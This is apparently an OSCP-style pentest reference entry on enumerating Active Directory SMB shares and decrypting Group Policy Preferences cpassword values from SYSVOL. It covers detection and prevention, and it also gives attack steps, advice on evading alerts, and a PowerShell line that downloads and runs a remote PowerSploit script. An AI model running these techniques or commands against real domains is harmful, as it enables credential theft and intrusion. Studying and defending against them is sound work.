name: AD Enumeration - Domain Share Discovery & SYSVOL Hunting
description: Enumerate all accessible SMB shares across every domain computer, then hunt SYSVOL for Group Policy Preferences (GPP) files containing encrypted passwords. GPP cpassword values use AES-256 but Microsoft published the key in 2012 — any cpassword found is trivially decryptable with gpp-decrypt. SYSVOL is world-readable by all authenticated domain users, making this a reliable low-hanging-fruit check.
source: OSCP PEN-200 Chapter 21: Active Directory Introduction and Enumeration (21.3.5)

examples.label: Find all domain shares (PowerView - runs from domain-joined Windows)
List SYSVOL policies folder on the DC
Recurse into a specific policy folder looking for Groups.xml / Scripts.ini
Read a Groups.xml file (contains cpassword attribute)
Decrypt a GPP cpassword (run on Kali)
CrackMapExec spider_plus to find interesting files on shares (from Linux)
Browse a non-SYSVOL share for sensitive files

notes: GPP cpassword files are found in SYSVOL under Policies\{GUID}\{Machine|User}\Preferences\Groups\Groups.xml, Services\Services.xml, ScheduledTasks\ScheduledTasks.xml, or Datasources\DataSources.xml. The AES key was published by Microsoft (MS14-025) — any cpassword value is decryptable regardless of age. Find-DomainShare scans every domain computer so it is noisy; target dc1/SYSVOL first for quick wins before broad scanning. After gpp-decrypt, try the password immediately against all domain accounts (password reuse). Also check non-SYSVOL shares for readme files, scripts, and config files containing credentials.

references.title: OffSec PEN-200 - Active Directory Introduction and Enumeration

recommended.note: Use gpp-decrypt on any cpassword value found in SYSVOL.
CrackMapExec --shares is the Linux equivalent of Find-DomainShare.
After finding interesting shares, spider_plus recursively indexes all files.

defense.why_it_works: Domain shares including SYSVOL (\\domain\SYSVOL) and NETLOGON are accessible to all domain users by default. SYSVOL contains Group Policy files — including legacy GPP (Group Policy Preferences) XML files that store credentials encrypted with a publicly known AES key (MS14-025). Enumeration with Find-DomainShare or net view reveals non-standard shares, and SYSVOL contains Group Policy infrastructure that may include scripts, credentials, or attack-path data.
defense.prerequisites: Any domain user. SMB access (port 445) to DC and other hosts. PowerView/Invoke-ShareFinder for automation. net view for manual enumeration.
defense.impact: T1135 Network Share Discovery + T1552.006 Unsecured Credentials: Group Policy Preferences. Discovers file shares for data exfiltration paths. SYSVOL GPP XML files with cpassword field contain AES-encrypted credentials crackable with Get-GPPPassword or gpp-decrypt — direct credential discovery without any privilege.
defense.detection:
High volume of \\host\C$ or \\host\SYSVOL access attempts from a single workstation in a short window. Event 5140 (network share accessed) in bulk. Sysmon Event 3: rapid SMB connections to many hosts. MDI: 'SMB network share enumeration'. Event 4688: Invoke-ShareFinder or PowerView process.
Monitor for unusual processes or command-line arguments such as net view, net share, Get-SmbShare, or ShareFinder. System and network discovery techniques often occur throughout an operation as new information is discovered. Data and events should not be viewed in isolation but as part of a chain of behavior (DET0155).
defense.artifacts: Event 5140: bulk share access from workstation | MDI: share enumeration alert | Sysmon Event 3: rapid SMB to many hosts | PowerShell Event 4104: Find-DomainShare / Invoke-ShareFinder | SYSVOL XML files with cpassword field accessed
defense.prevention:
Remove all GPP credentials from SYSVOL immediately (MS14-025 patch does not remove existing files). Script to find and delete: Find-GPOPasswords.ps1 or CrackMapExec --gpp-passwords. Audit SYSVOL for scripts and credential files regularly. Restrict access to sensitive shares (not accessible to all domain users). Monitor Event 5140 for bulk share access.
Operating System Configuration: Enable Windows firewall or use third-party firewall to prevent file/printer sharing if not needed.
Network Segmentation: Segment networks to prevent unauthenticated access to network shares; limit exposure of file servers.
defense.evasion: Access SYSVOL directly (always accessible, doesn't trigger share enumeration alerts). Process one share at a time with delays. Read specific known paths (\\domain\SYSVOL\domain\Policies) rather than scanning all shares.
defense.misconfiguration: GPP XML files with cpassword attribute still in SYSVOL (from pre-MS14-025 GPO creation). Sensitive scripts in SYSVOL. Non-standard shares with weak permissions. No monitoring of bulk SYSVOL access.
defense.vulnerable_config:
# GPP cpassword in SYSVOL (legacy — still present if never cleaned up):
# \\corp.local\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
# <Properties action='U' newName='' fullName='' description=''
#   cpassword='edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' ...>
# → gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' → cleartext password
defense.secure_config:
# Find and remove GPP cpassword files:
Get-ChildItem -Path '\\corp.local\SYSVOL' -Recurse -Include '*.xml' | Select-String 'cpassword'
# Remove any files found OR remove the cpassword element

# Microsoft KB2962486 (MS14-025) prevents NEW GPP passwords but doesn't remove old ones:
# Must manually audit and clean SYSVOL

# SIEM alert for GPP cpassword access:
# Event 5140: ObjectName contains 'Groups.xml' OR 'DataSources.xml' OR 'ScheduledTasks.xml'
# AND AccessMask=0x80 (read) → ALERT

# Audit SYSVOL regularly:
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
Get-GPPPassword
